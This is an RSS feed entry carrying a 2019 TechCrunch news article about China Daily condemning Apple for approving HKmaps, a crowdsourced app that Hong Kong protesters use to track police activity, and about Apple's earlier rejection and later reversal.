<link>https://techcrunch.com/2019/10/09/china-attacks-apple-for-allowing-hong-kong-crowdsourced-police-activity-app/</link>
<guid isPermaLink="true" >https://techcrunch.com/2019/10/09/china-attacks-apple-for-allowing-hong-kong-crowdsourced-police-activity-app/</guid>
<description>&lt;p id=&quot;speakable-summary&quot;&gt;&lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/apple&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;apple&quot;&gt;Apple’s&lt;/a&gt; decision to greenlight an app called &lt;a href=&quot;https://hkmap.live&quot;&gt;HKmaps&lt;/a&gt;, which is being used by pro-democracy protestors in Hong Kong to crowdsource information about street closures and police presence, is attracting the ire of the Chinese government.&lt;/p&gt;
&lt;p&gt;An &lt;a href=&quot;http://en.people.cn/n3/2019/1009/c90000-9620878.html&quot;&gt;article&lt;/a&gt; in Chinese state mouthpiece, China Daily, attacks the iPhone maker for reversing an earlier decision not to allow the app to be listed on the iOS App Store — claiming the app is “allowing the rioters in Hong Kong to go on violent acts” (via &lt;a href=&quot;https://www.theguardian.com/world/2019/oct/09/protecting-rioters-china-warns-apple-over-app-that-tracks-hong-kong-police&quot;&gt;The Guardian&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;HKmaps uses emoji to denote live police and protest activity around Hong Kong, as reported by users.&lt;/p&gt;
&lt;p&gt;The former British colony is a special administrative region of the People’s Republic of China that’s been able to maintain certain economic and and political freedoms since reunification with China — under the one country, two systems principle. But earlier this year &lt;a href=&quot;https://en.wikipedia.org/wiki/2019_Hong_Kong_protests&quot;&gt;pro-democracy protests&lt;/a&gt; broke out after the Hong Kong government sought to pass legislation that would allow for extradition to mainland China. It’s policing around those on-going protests that’s being made visible on HKmaps.&lt;/p&gt;
&lt;p&gt;The app’s developer denies the map enables illegal activity, &lt;a href=&quot;https://twitter.com/hkmaplive/status/1179419820078575621&quot;&gt;saying&lt;/a&gt; its function is “for info” purposes only — to allow residents to move freely around the city by being able to avoid protest flash-points. But the Chinese government is branding it “toxic”.&lt;/p&gt;
&lt;p&gt;“Business is business, and politics is politics. Nobody wants to drag Apple into the lingering unrest in Hong Kong. But people have reason to assume that Apple is mixing business with politics, and even illegal acts. Apple has to think about the consequences of its unwise and reckless decision,” the China Daily writer warns in a not-so-veiled threat about continued access to the Chinese market.&lt;/p&gt;
&lt;p&gt;“Providing a gateway for ‘toxic apps’ is hurting the feelings of the Chinese people, twisting the facts of Hong Kong affairs, and against the views and principles of the Chinese people,” it goes on. “Apple and other corporations should be able to discern right from wrong. They also need to know that only the prosperity of China and China’s Hong Kong will bring them a broader and more sustainable market.”&lt;/p&gt;
&lt;p&gt;The article takes further aim at Apple — claiming it reinstated a song which advocates for independence for Hong Kong and had previously been removed from its music store.&lt;/p&gt;
&lt;p&gt;We’ve reached out to Apple for comment.&lt;/p&gt;
&lt;p&gt;A few days ago the company was getting flak from the other direction as Western commentators &lt;a href=&quot;https://twitter.com/Pinboard/status/1179233095473602560&quot;&gt;piled on&lt;/a&gt; to express incredulity over its decision, at the app review stage, not to allow HKmaps on its store. The app’s developer said Apple App Store reviewers had rejected it citing the reasoning as “the app allowed users to evade law enforcement”.&lt;/p&gt;
&lt;div class=&quot;embed breakout&quot; readability=&quot;9.8663793103448&quot;&gt;
&lt;blockquote class=&quot;twitter-tweet&quot; data-width=&quot;550&quot; data-dnt=&quot;true&quot; readability=&quot;13.155172413793&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;&quot;Your app contains content – or facilitates, enables, and encourages an activity – that is not legal … Specifically, the app allowed users to evade law enforcement.&quot;&lt;a href=&quot;https://twitter.com/Apple?ref_src=twsrc%5Etfw&quot;&gt;@Apple&lt;/a&gt; assume our user are lawbreakers and therefore evading law enforcement, which is clearly not the case.&lt;/p&gt;
&lt;p&gt;— HKmap.live 全港抗爭即時地圖 (@hkmaplive) &lt;a href=&quot;https://twitter.com/hkmaplive/status/1179108329240424448?ref_src=twsrc%5Etfw&quot;&gt;October 1, 2019&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;p&gt;Yet, as many &lt;a href=&quot;https://twitter.com/zeynep/status/1179252223429218305&quot;&gt;pointed out&lt;/a&gt; at the time, the Google-owned Waze app literally describes its function as “avoid police” if you take the trouble to read its iOS listing. So it looked like a crystal-clear case of double standards by Cupertino. And, most awkwardly for Apple, as if the US tech giant was siding with the Chinese state against Hong Kong as concerned residents fight for their autonomy and call for democracy.&lt;/p&gt;
&lt;p&gt;We asked Apple about its decision to reject the app at the App Store review stage last week. It did not provide any comment but a couple of days afterwards a spokesman pointed us to an “update” — where the developer tweeted that the iOS version was “Approved, comming soon!” [sic].&lt;/p&gt;

&lt;div class=&quot;embed breakout&quot; readability=&quot;7.7889908256881&quot;&gt;
&lt;blockquote class=&quot;twitter-tweet&quot; data-width=&quot;550&quot; data-dnt=&quot;true&quot; readability=&quot;9.519877675841&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;It's on App Store now &lt;a href=&quot;https://t.co/bLjjN6yXpA&quot;&gt;https://t.co/bLjjN6yXpA&lt;/a&gt;&lt;br/&gt;There will not be any further comments on this matter unless status changes. We understand &lt;a href=&quot;https://twitter.com/Apple?ref_src=twsrc%5Etfw&quot;&gt;@Apple&lt;/a&gt; have many business considerations, but since they already make thing right I don't see any point to keep pressing.&lt;/p&gt;
&lt;p&gt;— HKmap.live 全港抗爭即時地圖 (@hkmaplive) &lt;a href=&quot;https://twitter.com/hkmaplive/status/1180376140453564416?ref_src=twsrc%5Etfw&quot;&gt;October 5, 2019&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;p&gt;At the time of writing the iOS app remains available on the App Store but the episode highlights the tricky trade-offs Apple is facing by operating in the Chinese market — a choice that risks denting its reputation for highly polished corporate values.&lt;/p&gt;
&lt;p&gt;The size of the China market is such that just “economical deceleration” can — &lt;a href=&quot;https://techcrunch.com/2019/01/02/apple-lowers-guidance-on-q1-results/&quot;&gt;and has&lt;/a&gt; — put a serious dent in Apple’s bottom line. If the company were to exit — or be ejected — from the market entirely there would be no way for it to cushion the blow for shareholders. Yet with a premium brand so bound up with ethical claims to champion and defend &lt;a href=&quot;https://techcrunch.com/2018/10/24/apples-tim-cook-makes-blistering-attack-on-the-data-industrial-complex/&quot;&gt;fundamental human rights like privacy&lt;/a&gt; Apple risks being pinned between a rock and a hard place as an increasingly powerful China flexes more political and economic muscle.&lt;/p&gt;
&lt;p&gt;Wider trade tensions between the US and China are also creating further instability, causing major &lt;a href=&quot;https://techcrunch.com/2019/02/26/huawei-the-us-security-accusation-of-our-5g-has-no-evidence-nothing/&quot;&gt;operating headaches&lt;/a&gt; for Chinese tech giant Huawei — with the Trump administration pressuring allies to freeze it out of 5G networks and leaning on US companies not to provide services to Chinese firms (leading to &lt;a href=&quot;https://techcrunch.com/2019/05/20/huawei-responds-android/&quot;&gt;question marks&lt;/a&gt; over whether Huawei’s smartphones can continue using Google’s Android OS, and suggestions it might seek to deploy its own OS).&lt;/p&gt;
&lt;p&gt;The going is certainly getting tougher for tech businesses working from East to West. But it also remains to be seen how sustainable Apple’s West-to-East democratic balancing act can be given heightened and escalating geopolitical tensions.&lt;/p&gt;

</description>
<pubDate>Wed, 09 Oct 2019 13:56:10 +0000</pubDate>
<dc:creator>elsewhen</dc:creator>
<og:title>China attacks Apple for allowing Hong Kong crowdsourced police activity app – TechCrunch</og:title>
<og:description>Apple’s decision to greenlight an app called HKmaps, which is being used by pro-democracy protestors in Hong Kong to crowdsource information about street closures and police presence, is attracting the ire of the Chinese government. An article in Chinese state mouthpiece, China Daily, attacks…</og:description>
<og:image>https://techcrunch.com/wp-content/uploads/2019/10/Screenshot-2019-10-09-at-10.27.11.png?w=686</og:image>
<og:url>http://social.techcrunch.com/2019/10/09/china-attacks-apple-for-allowing-hong-kong-crowdsourced-police-activity-app/</og:url>
<og:type>article</og:type>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://techcrunch.com/2019/10/09/china-attacks-apple-for-allowing-hong-kong-crowdsourced-police-activity-app/</dc:identifier>
</item>
</channel>
</rss>